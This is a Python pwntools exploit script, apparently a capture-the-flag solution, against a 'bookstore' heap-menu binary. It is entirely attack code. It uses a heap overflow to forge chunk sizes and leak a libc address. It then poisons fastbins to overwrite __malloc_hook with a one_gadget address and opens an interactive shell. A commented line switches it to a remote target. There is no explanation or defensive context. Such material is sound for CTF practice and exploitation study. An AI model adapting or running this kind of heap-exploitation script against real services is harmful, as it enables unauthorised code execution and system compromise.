#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./bookstore", env={"LD_PRELOAD":"./libc_64.so"})
#p = remote("ip", port) #uncomment this.

p.recvuntil("choice:\n")

def add(name, length, book):

    p.sendline("1")
    p.recvuntil("name?\n")
    p.send(name)
    p.recvuntil("name?\n")
    p.sendline(str(length))
    p.recvuntil("book?\n")
    p.send(book)
    p.recvuntil("choice:\n")

def sell(idx):

    p.sendline("2")
    p.recvuntil("sell?\n")
    p.sendline(str(idx))
    p.recvuntil("choice:\n")

def read(idx):

    p.sendline("3")
    p.recvuntil("sell?\n")
    p.sendline(str(idx))
    data = p.recvuntil("choice:\n")
    return data

add("a"*30, 0, "a\n")
for i in range(4):

    add("a"*30, 0x50, "a\n")

add("a"*30, 0, "a\n") #7
add("a"*30, 0x40, "a\n") #8
add("a"*30, 0, "b\n")
add("a"*30, 0x50, "b\n")
add("a"*30, 0x50, "b\n")
sell(0)
add("a"*30, 0, "a" * 24 + p64(0xc1)+"\n") #overflow
sell(1)
add("a" * 16 + p64(0x6f)+"\n", 20, "x"*8+"\n")
data = read(1)
libc_addr = data.split("x"*8)[1][:6]
libc = u64(libc_addr + "\0\0") - 0x3c4c28
print hex(libc)
one = libc + 0x4526a 
mallochook = libc + 0x3c4b10 - 0x10
target = libc + 0x3c4b38
#gogo
sell(5)
sell(6)
add("a"*30, 0, "a" * 24 + p64(0x51)+p64(0x6f)+"\n")
add("a"*30 ,0x40, "a\n")
sell(7)
sell(8)
add("a"*30, 0, "a"*24 + p64(0x61)+p64(target) + "\n")
add("a" * 30, 0x50, "a\n")
add("a"*30, 0x50, p64(0) * 6 + p64(mallochook) + "\n")
add("a"*30, 0x50, "a"*0x30+"\n")
add("a"*30, 0x50, p64(one) + "a"*0x30+"\n")
p.sendline("1")
p.sendline("aaaa")
p.sendline("20")
p.interactive()
